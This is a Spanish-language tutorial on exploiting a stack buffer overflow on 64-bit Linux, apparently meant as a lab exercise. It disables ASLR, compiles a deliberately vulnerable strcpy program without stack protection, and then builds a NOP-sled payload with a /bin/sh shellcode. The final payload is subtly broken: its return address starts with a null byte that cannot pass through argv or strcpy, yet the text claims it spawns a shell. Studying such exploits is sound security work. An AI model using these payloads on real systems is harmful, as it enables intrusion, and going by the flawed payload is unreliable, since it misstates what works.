# Tutorial: Buffer Overflow en x86_64 (64 bits)

Este tutorial demuestra cómo explotar una vulnerabilidad de Buffer Overflow en la arquitectura x86_64 (64 bits).

## Preparación del Entorno
Para facilitar las pruebas y mantener las direcciones de memoria consistentes, desactivamos la aleatorización del espacio de direcciones (ASLR):
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

---

## Ejemplo 1: Buffer Overflow Básico (Crash / Denegación de Servicio)

En este ejemplo vamos a sobrescribir el registro RIP (Instruction Pointer) para causar un fallo de segmentación (Segmentation Fault) en la aplicación.

### Código Vulnerable (`vuln1_64.c`)
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *str) {
    char buffer[64];
    // strcpy no verifica la longitud, introduciendo el desbordamiento
    strcpy(buffer, str);
    printf("Datos copiados exitosamente.\n");
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Uso: %s <texto>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}
```

### Instrucciones de Compilación
Para hacer vulnerable el binario, desactivamos la protección contra desbordamientos (`-fno-stack-protector`) y permitimos que la pila sea ejecutable (`-z execstack`):
```bash
gcc -fno-stack-protector -z execstack -g vuln1_64.c -o vuln1_64
```

### Revisión con GDB
1. Iniciamos GDB cargando el binario:
   ```bash
   gdb -q ./vuln1_64
   ```
2. En 64-bits, la estructura típica de la pila asigna 64 bytes para el buffer y luego 8 bytes para el saved RBP (Base Pointer). El RIP (Return Instruction Pointer) se encuentra justo después, es decir, necesitamos al menos 72 bytes de relleno.
   ```gdb
   (gdb) run $(python3 -c "print('A' * 72 + 'B' * 6)")
   ```
3. El programa mostrará un "Segmentation fault" y el RIP apuntará a `0x424242424242` (correspondiente a las 'B's), confirmando que hemos secuestrado el flujo de control.

---

## Ejemplo 2: Buffer Overflow con Ejecución de Código (Shellcode)

Ahora explotaremos la misma vulnerabilidad para inyectar y ejecutar shellcode. A diferencia de 32 bits, en x86_64 las direcciones de memoria son mucho más altas (y deben respetar las restricciones de "canonical addresses" de 48 bits).

### Código Vulnerable (`vuln2_64.c`)
(El mismo código que el utilizado en el Ejemplo 1).

### Instrucciones de Compilación
```bash
gcc -fno-stack-protector -z execstack -g vuln2_64.c -o vuln2_64
```

### Revisión y Explotación con GDB

1. **Obtener la dirección de la pila:**
   Ejecutamos el programa paso a paso para inspeccionar dónde inicia nuestro buffer.
   ```bash
   gdb -q ./vuln2_64
   (gdb) break vulnerable_function
   (gdb) run $(python3 -c "print('A' * 72 + 'B' * 6)")
   (gdb) next
   (gdb) print $rsp
   ```
   Toma nota de la dirección de la pila, por ejemplo: `0x7fffffffe100`.

2. **Preparar el Shellcode de 64-bits:**
   Un shellcode típico de 22 bytes para ejecutar `/bin/sh` en Linux x86_64:
   `\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05`

3. **Construir el Payload y Ejecutar:**
   Estructura: `[NOP Sled] + [Shellcode] + [Padding] + [Dirección de Retorno]`
   - NOP Sled: `\x90` (30 bytes).
   - Shellcode: 22 bytes.
   - Padding: Relleno para alcanzar los 72 bytes (20 bytes de `A`).
   - Retorno: `0x7fffffffe100` escrito en Little Endian (6 bytes útiles debido a la restricción canónica: `\x00\xe1\xff\xff\xff\x7f`).

   Ejecuta el exploit en GDB:
   ```gdb
   (gdb) run $(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*30 + b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05' + b'A'*20 + b'\x00\xe1\xff\xff\xff\x7f')")
   ```
   *Nota:* Si el offset y la dirección son correctos, GDB indicará que un nuevo proceso `/bin/dash` o `/bin/sh` ha sido iniciado, logrando así la ejecución arbitraria de código.
